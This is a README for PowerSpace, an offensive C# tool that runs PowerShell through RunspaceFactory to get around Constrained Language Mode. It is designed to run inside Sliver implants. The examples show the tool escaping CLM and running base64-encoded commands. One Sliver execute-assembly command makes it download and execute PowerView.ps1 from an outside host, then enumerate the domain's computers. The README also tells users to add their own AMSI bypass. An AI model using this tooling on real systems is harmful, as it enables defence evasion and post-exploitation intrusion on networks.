# PowerSpace
Simple `C#` .Net Framework program that use `RunspaceFactory` for PowerShell from `System.Management.Automation.dll` in order to execute anything as `FullLanguage`.

## Key Features
- Executes PowerShell commands and scripts in `FullLanguage` mode using `RunspaceFactory`.
- Parses and executes commands, Base64-encoded commands, and scripts fetched from URLs.
- Verbose output to aid in debugging and crafting complex queries.
- Suitable for integration with implant frameworks like Sliver.

Below is an example of running `powerspace` through a PowerShell Constrained Language Mode (CLM):
```powershell
PS C:\Users\win\Desktop\Dev> .\powerspace.exe /c:"$ExecutionContext.SessionState.LanguageMode" 
[+] Received arguments: /c:$ExecutionContext.SessionState.LanguageMode

[+] Parsed Arguments:
/c       $ExecutionContext.SessionState.LanguageMode
/e       null
/m       null

[+] Executing: $ExecutionContext.SessionState.LanguageMode

-------- Runspace Output --------

FullLanguage

-------- Runspace Output --------
```

> [!IMPORTANT]
> There is no AMSI bypass or patch integrated. Add your own or find your way.

## Beacon / Implant Integration
This tool is particularly built with the mindset of running through an implant as an assembly, leveraging the inherent design of `C#` binaries:
```shell
sliver (ENORMOUS_FISHBONE) > execute-assembly -i -M -E /home/kali/backpack/d/powerspace.exe /m:"http://192.168.45.202/winaries/pwsh/PowerView.ps1" /c:"Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName"

[*] Output:
[+] Received arguments: /m:http://192.168.45.202/winaries/pwsh/PowerView.ps1 /c:Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName

[+] Parsed Arguments:
/c       Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
/e       null
/m       http://192.168.45.202/winaries/pwsh/PowerView.ps1

[+] Executing: http://192.168.45.202/winaries/pwsh/PowerView.ps1
[i] No output
[+] Executing: Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName

-------- Runspace Output --------

dnshostname
-----------
client.test.lab
dc.test.lab
mail.test.lab
sql.test.lab

-------- Runspace Output --------
```

### Sliver
This repository aims to facilitate the [`sliver`](https://github.com/bishopfox/sliver) implementation. You can directly copy the content of the named `sliver` directory:
```shell
cp -r ~/git/perso/powerspace/sliver ~/.sliver-client/aliases/powerspace
```

## Examples
### Running multiple commands

```powershell
PS C:\Users\win\Desktop\Dev> .\powerspace.exe /c:"whoami" /c:"hostname"
[+] Parsed Arguments:
/c       whoami
/c       hostname
/e       null
/m       null

[+] Executing: whoami

-------- Runspace Output --------

wind\win

-------- Runspace Output --------

[+] Executing: hostname

-------- Runspace Output --------

WinD

-------- Runspace Output --------
```

### Running UTF-16LE base64-encoded commands
Use [CyberChef](https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-16LE%20(1200)')To_Base64('A-Za-z0-9%252B/%253D'))  to encode you commands:

```powershell
PS C:\Users\win\Desktop\Dev> .\powerspace.exe /e:"dwBoAG8AYQBtAGkA"
[+] Received arguments: /e:dwBoAG8AYQBtAGkA

[+] Parsed Arguments:
/c       null
/e       dwBoAG8AYQBtAGkA
/m       null

[+] Executing: whoami

-------- Runspace Output --------

wind\win

-------- Runspace Output --------
```

## Implementation Choices
I chose to create a simple command parser instead of using the `CommandLine` package to avoid the complexity of integrating `dnMerge` for compilation. The primary goal was to maintain ease of use. For the arguments, I implemented Windows-style parsing with the `/` convention to avoid conflicts with other tools, such as sliver.